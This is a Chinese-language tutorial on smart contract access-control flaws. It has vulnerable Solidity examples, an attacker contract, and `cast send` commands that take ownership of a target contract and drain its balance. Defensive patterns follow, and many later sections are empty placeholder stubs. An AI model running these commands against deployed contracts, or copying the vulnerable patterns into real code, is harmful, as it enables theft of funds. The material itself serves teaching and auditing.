# 访问控制 (Access Control)

## 原理

合约未正确实现权限控制，导致未授权用户可以执行管理员功能、修改关键参数、提取资金等。

## 经典漏洞

### 1. tx.origin 误用

```solidity
// 漏洞：使用 tx.origin 而非 msg.sender
contract Vulnerable {
    address owner;
    
    function transfer(address to, uint amount) public {
        // 漏洞：tx.origin 可能是用户，msg.sender 是攻击合约
        require(tx.origin == owner, "Not owner");
        payable(to).transfer(amount);
    }
}

// 攻击合约
contract Attacker {
    Vulnerable target;
    
    constructor(address _target) {
        target = Vulnerable(_target);
    }
    
    function attack() public {
        // 如果 owner 调用了这个函数
        // tx.origin == owner，绕过检查
        target.transfer(attacker, balance);
    }
}
```

### 2. 缺失权限检查

```solidity
// 漏洞：关键函数没有权限检查
contract Vulnerable {
    address owner;
    
    function setOwner(address newOwner) public {
        // 漏洞：没有 require(msg.sender == owner)
        owner = newOwner;
    }
    
    function withdraw() public {
        // 漏洞：没有权限检查
        payable(owner).transfer(address(this).balance);
    }
}
```

### 3. 公共 mint

```solidity
// 漏洞：mint 函数公开
contract Vulnerable {
    mapping(address => uint) public balances;
    
    function mint(address to, uint amount) public {
        // 漏洞：任何人都可以 mint
        balances[to] += amount;
    }
}
```

### 4. 初始化函数可重复调用

```solidity
// 漏洞：initialize 可重复调用
contract Vulnerable {
    address owner;
    bool initialized;
    
    function initialize() public {
        // 漏洞：没有检查 initialized
        owner = msg.sender;
        initialized = true;
    }
}

// 攻击者在部署后调用 initialize，成为 owner
```

### 5. delegatecall 滥用

```solidity
// 漏洞：delegatecall 保留 msg.sender
contract Vulnerable {
    address owner;
    
    function delegate(address impl, bytes memory data) public {
        // 漏洞：delegatecall 保留 msg.sender 和 msg.value
        (bool success, ) = impl.delegatecall(data);
        require(success);
    }
}

// 攻击者通过 delegate 调用 setOwner
```

## 攻击链

### 1. 识别权限漏洞

```bash
# 查看合约源码
# 1. 检查 owner/ admin 设置
# 2. 检查 modifier
# 3. 检查 require
# 4. 检查 tx.origin vs msg.sender
```

### 2. 利用漏洞

```bash
# 使用 cast
cast send $TARGET "setOwner(address)" $ATTACKER --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $TARGET "withdraw()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
```

## 防护方法

### 1. 使用 modifier

```solidity
modifier onlyOwner() {
    require(msg.sender == owner, "Not owner");
    _;
}

function setOwner(address newOwner) public onlyOwner {
    owner = newOwner;
}
```

### 2. 使用 OpenZeppelin Ownable

```solidity
import "@openzeppelin/contracts/access/Ownable.sol";

contract MyContract is Ownable {
    function withdraw() public onlyOwner {
        // ...
    }
}
```

### 3. 使用 AccessControl

```solidity
import "@openzeppelin/contracts/access/AccessControl.sol";

contract MyContract is AccessControl {
    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    
    constructor() {
        _setupRole(ADMIN_ROLE, msg.sender);
    }
    
    function withdraw() public onlyRole(ADMIN_ROLE) {
        // ...
    }
}
```

### 4. 避免使用 tx.origin

```solidity
// 错误
require(tx.origin == owner);

// 正确
require(msg.sender == owner);
```

## 攻击变种

### 1. 角色提权

```solidity
// 普通用户提升为管理员
// 通过漏洞修改角色
```

### 2. 多签钱包攻击

```solidity
// 多签钱包的权限漏洞
// 单签执行交易
```

### 3. 代理合约攻击

```solidity
// 代理合约的权限漏洞
// 升级到恶意实现
```

### 4. 元交易攻击

```solidity
// 元交易的权限漏洞
// 中继者伪造交易
```

### 5. 账户抽象攻击

```solidity
// ERC-4337 的权限漏洞
// Paymaster 漏洞
```

## 2024-2026 新技术点

### 1. 账户抽象访问控制

```solidity
// ERC-4337
// 新的访问控制模式
```

### 2. Layer 2 访问控制

```solidity
// Optimistic Rollup
// ZK Rollup
// 新的访问控制
```

### 3. 跨链访问控制

```solidity
// 跨链桥
// 新的访问控制
```

### 4. DAO 治理攻击

```solidity
// 治理投票
// 提案执行
// 新的攻击模式
```

### 5. NFT 访问控制

```solidity
// ERC-721/ERC-1155
// 新的访问控制
```

### 6. 闪电贷访问控制

```solidity
// 闪电贷 + 访问控制
// 新的攻击模式
```

### 7. MEV 访问控制

```solidity
// MEV 机器人
// 新的访问控制
```

### 8. 零知识证明访问控制

```solidity
// zk-SNARK
// 新的访问控制
```

### 9. 多签钱包新攻击

```solidity
// Gnosis Safe
// 新的攻击模式
```

### 10. AI 辅助检测

```python
# ML 辅助
# 自动检测权限漏洞
# 模式识别
```

## 工具推荐

- **Slither** — 静态分析
- **Mythril** — 符号执行
- **Echidna** — 模糊测试
- **OpenZeppelin** — 安全库

## 参考链接

- [SWC-105: Unprotected Ether Withdrawal](https://swcregistry.io/docs/SWC-105)
- [SWC-106: Unprotected SELFDESTRUCT](https://swcregistry.io/docs/SWC-106)
- [SWC-115: Authorization through tx.origin](https://swcregistry.io/docs/SWC-115)
- [Parity Wallet Hack](https://www.parity.io/blog/a-postmortem-on-the-parity-multi-sig-library-self-destruct/)
